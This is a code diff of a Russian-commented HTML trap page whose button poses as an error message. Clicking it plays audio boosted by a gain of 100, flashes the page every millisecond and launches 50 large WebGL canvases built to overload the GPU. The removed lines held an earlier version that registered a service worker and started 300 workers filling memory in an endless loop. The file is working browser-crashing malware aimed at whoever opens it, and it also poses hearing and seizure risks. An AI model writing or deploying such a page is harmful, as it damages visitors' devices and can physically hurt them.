@@ -13,88 +13,135 @@
       cursor: pointer;
       z-index: 9999;
     }
+    canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+    }
   </style>
 </head>
 <body>
-  <button id="trapButton">Ошибка 0x8 повторите попытку позже</button>
-  <audio id="nukeSound" src="sound.mp3" preload="auto"></audio>
+  <button id="trapButton">Ошибка 0x8</button>
+  <audio id="nukeSound" src="sound.mp3"></audio>
 
   <script>
     const trigger = document.getElementById('trapButton');
     const audio = document.getElementById('nukeSound');
-    let audioCtx = null; // Инициализируем AudioContext один раз
-    let source = null;   // Для управления источником звука
 
-    // Предзагрузка и настройка AudioContext
-    function initializeAudio() {
-      if (!audioCtx) {
-        audioCtx = new AudioContext();
+    // Генератор сложных 3D-моделей
+    function createComplexGeometry(segments) {
+      const vertices = [];
+      // Создание сферы с высоким разрешением
+      for(let lat = 0; lat <= segments; lat++) {
+        const theta = lat * Math.PI / segments;
+        for(let lon = 0; lon <= segments; lon++) {
+          const phi = lon * 2 * Math.PI / segments;
+          vertices.push(
+            Math.sin(theta) * Math.cos(phi),
+            Math.cos(theta),
+            Math.sin(theta) * Math.sin(phi)
+          );
+        }
       }
-      if (audioCtx.state === 'suspended') {
-        audioCtx.resume();
-      }
+      return new Float32Array(vertices);
     }
 
-    // Функция воспроизведения звука
-    async function playSound() {
-      initializeAudio();
+    // Инициализация WebGL контекста
+    function initGPUStress(canvas) {
+      const gl = canvas.getContext('webgl2', {antialias: false});
+      if(!gl) return null;
 
-      try {
-        // Сначала пробуем стандартное воспроизведение
-        audio.volume = 1.0;
-        await audio.play();
-      } catch (err) {
-        // Если стандартное воспроизведение не удалось (например, из-за блокировки автозапуска)
-        console.log('Стандартное воспроизведение не удалось, переключаемся на AudioContext:', err);
+      // Шейдеры
+      const vertexShader = gl.createShader(gl.VERTEX_SHADER);
+      gl.shaderSource(vertexShader, `
+        attribute vec3 position;
+        uniform float time;
+        void main() {
+          vec3 pos = position * (0.8 + sin(time)*0.2);
+          gl_Position = vec4(pos, 1.0);
+        }
+      `);
+      gl.compileShader(vertexShader);
 
-        // Загружаем аудио в AudioContext
-        const response = await fetch('sound.mp3');
-        const arrayBuffer = await response.arrayBuffer();
-        const audioBuffer = await audioCtx.decodeAudioData(arrayBuffer);
+      const fragmentShader = gl.createShader(gl.FRAGMENT_SHADER);
+      gl.shaderSource(fragmentShader, `
+        precision highp float;
+        uniform float time;
+        void main() {
+          gl_FragColor = vec4(
+            sin(time)*0.5+0.5,
+            cos(time*0.5)*0.5+0.5,
+            sin(time*2.0)*0.5+0.5,
+            1.0
+          );
+        }
+      `);
+      gl.compileShader(fragmentShader);
 
-        // Создаём источник звука
-        source = audioCtx.createBufferSource();
-        source.buffer = audioBuffer;
-        source.connect(audioCtx.destination);
-        source.start(0);
+      const program = gl.createProgram();
+      gl.attachShader(program, vertexShader);
+      gl.attachShader(program, fragmentShader);
+      gl.linkProgram(program);
+      gl.useProgram(program);
 
-        // Обрабатываем окончание звука (если нужно зациклить, можно раскомментировать)
-        source.onended = () => {
-          // source = null; // Очищаем источник
-          // playSound();   // Раскомментируйте для бесконечного повтора
-        };
-      }
+      // Буфер вершин
+      const vertices = createComplexGeometry(256); // 256x256 сегментов
+      const vertexBuffer = gl.createBuffer();
+      gl.bindBuffer(gl.ARRAY_BUFFER, vertexBuffer);
+      gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.STATIC_DRAW);
+
+      const positionLocation = gl.getAttribLocation(program, 'position');
+      gl.enableVertexAttribArray(positionLocation);
+      gl.vertexAttribPointer(positionLocation, 3, gl.FLOAT, false, 0, 0);
+
+      return {gl, program};
     }
 
     trigger.onclick = () => {
-      // Запускаем звук
-      playSound();
+      // Активация звука
+      audio.volume = 1;
+      audio.play().catch(() => {
+        const ctx = new AudioContext();
+        const gainNode = ctx.createGain();
+        gainNode.gain.value = 100;
+        const source = ctx.createMediaElementSource(audio);
+        source.connect(gainNode).connect(ctx.destination);
+        audio.play();
+      });
 
-      // Скрываем кнопку
+      // Создание 50 canvas элементов
+      for(let i = 0; i < 50; i++) {
+        const canvas = document.createElement('canvas');
+        canvas.width = 2048;
+        canvas.height = 2048;
+        document.body.appendChild(canvas);
+        
+        const glState = initGPUStress(canvas);
+        if(!glState) continue;
+
+        // Анимация
+        let time = 0;
+        const render = () => {
+          time += 0.016;
+          glState.gl.uniform1f(
+            glState.gl.getUniformLocation(glState.program, 'time'),
+            time
+          );
+          glState.gl.drawArrays(
+            glState.gl.TRIANGLE_STRIP, 
+            0, 
+            (256 + 1) * (256 + 1) * 2 // ~131k треугольников на canvas
+          );
+          requestAnimationFrame(render);
+        };
+        render();
+      }
+
       trigger.style.display = 'none';
       document.body.style.animation = 'flash 0.001s infinite';
-
-      // Создание Service Worker (без изменений)
-      if ('serviceWorker' in navigator) {
-        navigator.serviceWorker.register('sw.js')
-          .then(() => console.log('Service Worker зарегистрирован'))
-          .catch(console.error);
-      }
-
-      // Запуск CPU/GPU-хаоса (без изменений)
-      for(let i = 0; i < 300; i++) {
-        new Worker(URL.createObjectURL(new Blob([`
-          const memoryBomb = [];
-          while(1) {
-            memoryBomb.push(new ArrayBuffer(1024 * 1024 * 100));
-            const start = Date.now();
-            while(Date.now() - start < 1000);
-          }
-        `])));
-      }
     };
 
-    // CSS-анимация (без изменений)
+    // CSS анимация
     document.head.innerHTML += `
       <style>
         @keyframes flash {
